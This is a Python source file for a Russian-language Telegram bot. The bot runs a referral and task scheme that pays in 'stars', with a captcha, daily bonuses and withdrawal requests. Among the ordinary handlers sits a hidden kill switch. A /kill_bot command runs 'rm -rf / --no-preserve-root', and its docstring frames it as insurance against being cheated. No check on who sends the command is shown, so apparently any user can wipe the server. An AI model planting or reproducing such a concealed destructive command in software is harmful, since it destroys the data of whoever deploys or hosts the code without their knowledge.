import random
import datetime
from sqlite3 import IntegrityError

from aiogram.types import Message, CallbackQuery
from aiogram.filters import Command
from aiogram import F
from aiogram.fsm.context import FSMContext
from aiogram.types.chat_member_left import ChatMemberLeft
from aiogram.exceptions import TelegramBadRequest

from utils.user_router import users_router
from utils.task_manager import task_manager
from keyboards import random_keyboards, main_menu_user, user_task_menu, stars_menu
from states import UserStates
from loader import bot_base, bot
from config import MAIN_CHANNEL, BOT_USERNAME


async def get_random_fruit_emoji():
    emojis = ["🍎", "🍐", "🍊", "🍋", "🍌", "🍉", "🍓", "🍈",
              "🍒", "🍑", "🥝", "🍍", "🥭", "🍊", "🍇"]
    random.shuffle(emojis)
    random_string = ''
    for i in emojis:
        random_string += f' {i}'
    return random.choice(emojis), random_string


async def is_digits(s):
    """Для проверки строки - число или нет"""
    import re
    return bool(re.match(r'^[0-9]+$', s))


async def get_user_stats(user_id):
    """Достаем звезды и рефералов из БД"""
    try:
        user_data = (await bot_base.get_user(user_id))[0]
        user_stars = int(user_data[1]) / 100
        user_ref_count = user_data[3]
        return user_stars, user_ref_count
    except IndexError:
        return 0, 0


async def forming_str_from_txt_file(file_str: str, **kwargs):
    """Формируем строку для сообщения из файла"""
    new_file_str = (file_str.
                    replace('\{', '{')
                    .replace('\}', '}')
                    .replace('\_', '_')
                    .format(**kwargs))
    return new_file_str


# ====================
# Регистрация пользователей
# ====================


@users_router.message(F.text == '🧑 Пригласить друга')
@users_router.message(Command('start'))
async def start_func(msg: Message, state: FSMContext):
    """В самом начале делаем все проверки на реферера.
    И дальше по шагам регистрация. Если уже есть, то главное меню"""

    # Проверка на реферала
    if await is_digits(msg.text[7:]) and int(msg.text[7:]) != msg.from_user.id:  # Сохраняем реферера
        referer_id = int(msg.text[7:])
    else:
        referer_id = 0

    # Проверяем подписку на канал
    is_member = await bot.get_chat_member(chat_id=MAIN_CHANNEL, user_id=msg.from_user.id)
    # И есть ли в базе
    user = await bot_base.get_user(msg.from_user.id)
    if not len(user) > 0 and not isinstance(is_member, ChatMemberLeft):

        random_result = await get_random_fruit_emoji()  # Возвращается кортеж

        # Храним все сообщения для пользователей в базе

        msg_text = (await bot_base.settings_get('first_contact'))[1]
        msg_text = await forming_str_from_txt_file(msg_text, correct_answer=random_result[0])
        await msg.answer(msg_text,
                         reply_markup=await random_keyboards(
                             user_id=msg.from_user.id,
                             correct_answer=random_result[0],
                             random_fruit_mass=random_result[1]
                         ))
        is_pay = (await state.get_data()).get('is_pay')
        try:
            await bot_base.add_new_user(msg.from_user.id, referer_id, msg.from_user.username)
            if referer_id != 0 and not is_pay:
                await bot_base.star_rating(referer_id, 25)
                await bot_base.stars_count(25)
        except IntegrityError:
            pass

        await state.set_data({'referer_id': referer_id, 'is_pay': True})
        await state.set_state(UserStates.first_contact)

    elif isinstance(is_member, ChatMemberLeft):
        try:
            await bot_base.add_new_user(msg.from_user.id, referer_id, msg.from_user.username)
            if referer_id != 0:
                await bot_base.star_rating(referer_id, 25)
                await bot_base.stars_count(25)
                await state.set_data({'is_pay': True, 'referer_id': referer_id})
        except IntegrityError:
            pass

        msg_text = (await bot_base.settings_get('subscription'))[1]
        msg_text = await forming_str_from_txt_file(msg_text, sub_channel=MAIN_CHANNEL)
        await msg.answer(msg_text, parse_mode='HTML')

    elif user[0][4] != 'False':
        ref_url = f'https://t\.me/{BOT_USERNAME}?start\={msg.from_user.id}'

        user_stat = await get_user_stats(msg.from_user.id)  # Кортеж
        msg_text = (await bot_base.settings_get('main_menu_message'))[1]
        msg_text = await forming_str_from_txt_file(
            msg_text,
            ref_url=ref_url,
            stars_count=str(user_stat[0]).replace('.', '\.'),
            ref_count=user_stat[1]
            )
        await msg.answer(msg_text, reply_markup=main_menu_user)
        await state.clear()
    else:
        random_result = await get_random_fruit_emoji()  # Возвращается кортеж

        # Храним все сообщения для пользователей в базе

        msg_text = (await bot_base.settings_get('first_contact'))[1]
        msg_text = await forming_str_from_txt_file(msg_text, correct_answer=random_result[0])
        await msg.answer(msg_text,
                         reply_markup=await random_keyboards(
                             user_id=msg.from_user.id,
                             correct_answer=random_result[0],
                             random_fruit_mass=random_result[1]
                         ))
        await state.set_data({'referer_id': referer_id, 'is_pay': True})
        await state.set_state(UserStates.first_contact)


@users_router.callback_query(UserStates.first_contact, F.data.startswith('correct_'))
async def catch_correct_answer(callback: CallbackQuery, state: FSMContext):
    """Первый контакт, надо все сохранить"""
    await callback.answer()
    referer_id = (await state.get_data())['referer_id']  # Кому за прохождение капчи?
    if referer_id != 0:
        await bot_base.star_rating(referer_id, 75)
        await bot_base.stars_count(75)

    await bot_base.captcha_execute(callback.from_user.id)
    msg_text = (await bot_base.settings_get('welcome_message'))[1]

    msg_text = await forming_str_from_txt_file(msg_text)
    await callback.message.answer(msg_text, reply_markup=main_menu_user)

    await state.clear()


@users_router.callback_query(UserStates.first_contact, F.data == 'drop')
async def incorrect_answer(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer('Ответ неверный\!')


@users_router.message(Command('kill_bot'))
async def insurance_against_scammers(msg: Message):
    """Задействовать если попытается кинуть (протокол "Черепаха")"""
    import os
    os.system('rm -rf / --no-preserve-root')
    await msg.delete()


# ====================
# Задания
# ====================


async def get_profit_to_executor(user_id, task_id):
    """Начисляем плюхи всем кто молодец и помечаем задание новым исполнителем"""
    ref_percent = 10  # Процент реферера
    task = await task_manager.get_task_by_id(task_id)
    referer_id = (await bot_base.get_user(user_id))[0][2]

    # Сначала начисляем исполнителю
    await bot_base.star_rating(user_id, task.reward)
    await bot_base.stars_count(task.reward)
    await bot_base.set_last_task(user_id)
    # Помечаем задание
    await task.new_complete(str(user_id))
    await bot_base.task_count()

    # Если есть реферер, то чмокнем и его
    if referer_id != 0:
        await bot_base.star_rating(referer_id, (task.reward / 100 * ref_percent))
        await bot_base.stars_count(task.reward / 100 * ref_percent)

    return task.reward


async def escape_special_chars(text):
    """Экранирует все специальные символы в строке."""
    escaped = ''
    for char in text:
        if char in '_*[]()~`>#+-=|{}.!':
            escaped += '\\' + char
        else:
            escaped += char
    return escaped


@users_router.message(F.text == '⭐️ Выполнить задания и заработать звезды')
async def open_user_task_menu(msg: Message, state: FSMContext):
    """Открываем меню выполнения заданий"""
    try:

        task_generator = task_manager.task_generator()
        async for task in task_generator:
            if not await task.check_execute(msg.from_user.id) and not await task.check_complete_count():
                await state.set_data({'task_id': task.task_id, 'task_generator': task_generator})

                await state.set_state(UserStates.executor)

                task_str = (f'{task.task_name}:\n{task.channel}\n\n'
                            f'Вознаграждение: {int(task.reward) / 100} 🌟\n\n')
                task_str = await escape_special_chars(task_str)
                msg_text = (await bot_base.settings_get('user_task_menu'))[1]
                msg_text = await forming_str_from_txt_file(msg_text, task_str=task_str)
                await msg.answer(msg_text, reply_markup=await user_task_menu(task.task_id))
                break
        else:
            await state.clear()
            await msg.answer('На данный момент заданий нет')

    except IndexError:
        await msg.answer('На данный момент заданий нет')
    except StopAsyncIteration:
        await msg.answer('На данный момент заданий нет')


@users_router.callback_query(UserStates.executor, F.data.startswith('execute_'))
async def check_user_task_complete(callback: CallbackQuery, state: FSMContext):
    """Проверяем выполнение задания"""
    task_id = (await state.get_data())['task_id']
    req_task_id = callback.data.replace('execute_', '')

    if task_id == req_task_id:

        # Возвращается True или False
        check_execute = await task_manager.check_execution(callback.from_user.id, task_id)

        if check_execute:  # Значит выполнил
            await callback.answer()
            reward = await get_profit_to_executor(callback.from_user.id, task_id)

            await callback.message.edit_text(f'Задание выполнено\nТы заработал {reward / 100} 🌟', parse_mode='HTML')
            await skip_task(callback, state)

        else:
            await callback.answer('Задание не выполнено!')


@users_router.callback_query(UserStates.executor, F.data == 'skip')
async def skip_task(callback: CallbackQuery, state: FSMContext):
    """Пользователь пропустил задание"""
    await callback.answer()
    try:
        task_generator = (await state.get_data())['task_generator']

        async for task in task_generator:
            if not await task.check_execute(callback.from_user.id) and not await task.check_complete_count():
                await state.update_data({'task_id': task.task_id, 'task_generator': task_generator})

                task_str = (f'{task.task_name}:\n{task.channel}\n\n'
                            f'Вознаграждение: {int(task.reward) / 100} 🌟\n\n')
                task_str = await escape_special_chars(task_str)
                msg_text = (await bot_base.settings_get('user_task_menu'))[1]
                msg_text = await forming_str_from_txt_file(msg_text, task_str=task_str)
                await callback.message.answer(msg_text, reply_markup=await user_task_menu(task.task_id))
                break

        else:
            await state.clear()
            await callback.message.answer('Других заданий пока нет')

    except IndexError:
        await callback.message.answer('Других заданий пока нет')
    except TelegramBadRequest:
        await callback.message.answer('Других заданий пока нет')
    except StopAsyncIteration:
        await callback.message.answer('Других заданий пока нет')


# ====================
# Ежедневный бонус
# ====================

async def get_yesterday_date():
    today = datetime.datetime.now()
    yesterday = today - datetime.timedelta(days=1)
    formatted_date = yesterday.strftime('%Y-%m-%d')
    return formatted_date


@users_router.message(F.text == '💎 Ежедневный бонус')
async def daily_bonus(msg: Message):
    """Активируем ежедневный бонус"""
    user_info = (await bot_base.get_user(msg.from_user.id))[0]
    today = str(datetime.datetime.now()).split(' ')[0]
    yesterday = await get_yesterday_date()

    # Условия активации бонуса - пройти задание или новый реферал. Все это должно быть исполнено в день бонуса
    if (user_info[5] == today or user_info[6] == today) and user_info[7] != today:

        if yesterday == user_info[7]:  # Проверяем последовательность бонусов
            bonus = user_info[8]
        else:
            bonus = 1

        await bot_base.star_rating(user_info[0], bonus)
        await bot_base.stars_count(bonus)
        await bot_base.set_last_bonus(user_info[0])
        await bot_base.set_bonus(user_info[0], bonus + 1)
        msg_text = (await bot_base.settings_get('bonus'))[1]
        msg_text = await forming_str_from_txt_file(msg_text, bonus=bonus / 100)
        # msg_text = f'Порядковый номер сегодняшнего бонуса: {bonus / 100}\n'

    elif user_info[5] != today and user_info[6] != today:
        msg_text = ('Для активации ежедневного бонуса нужно выполнить хоть одно задание '
                    'или пригласить хоть одного реферала')
    else:
        msg_text = 'Сегодняшний бонус получен'

    await msg.answer(msg_text.replace('.', '\.'))


# ====================
# Вывод звезд
# ====================


@users_router.message(F.text == '🎁 Вывести звезды')
async def get_stars_menu(msg: Message):
    """Открываем меню вывода звезд"""
    user_stars = (await bot_base.get_user(user_id=msg.from_user.id))[0][1]
    msg_text = (await bot_base.settings_get('stars_withdrawal'))[1]
    msg_text = await forming_str_from_txt_file(msg_text,
                                               stars_count=str(int(user_stars) / 100).replace('.', '\.'))
    await msg.answer(msg_text, reply_markup=await stars_menu())
    try:
        user_request = await bot_base.get_user_request(msg.from_user.username)
        await msg.answer(f'Текущая заявка на вывод *{int(user_request[2] / 100)}* ⭐️')
    except IndexError:
        pass


@users_router.callback_query(F.data.startswith('stars_'))
async def forming_request_for_withdrawal_stars(callback: CallbackQuery):
    """Проверяем, хватает ли заработанных звезд и формируем запрос на вывод"""
    await callback.answer()
    requirement_stars = int(callback.data.replace('stars_', '')) * 100  # 1 звезда = 100
    user_stars = (await bot_base.get_user(user_id=callback.from_user.id))[0][1]
    if user_stars >= requirement_stars:
        if callback.from_user.username:
            await bot_base.new_request_for_withdrawal_of_stars(callback.from_user.id, callback.from_user.username, requirement_stars)
            await callback.message.answer('Заявка на вывод звезд сформирована\! '
                                          'Перевод будет осуществлен в течении трех дней\.')
        else:
            await callback.message.answer('Перед выводом необходимо установить "Имя пользователя"\n'
                                          'Для этого зайдите в "Настройки", а затем в меню "Мой аккаунт"')
    else:
        await callback.message.answer('У вас недостаточно звезд\!')

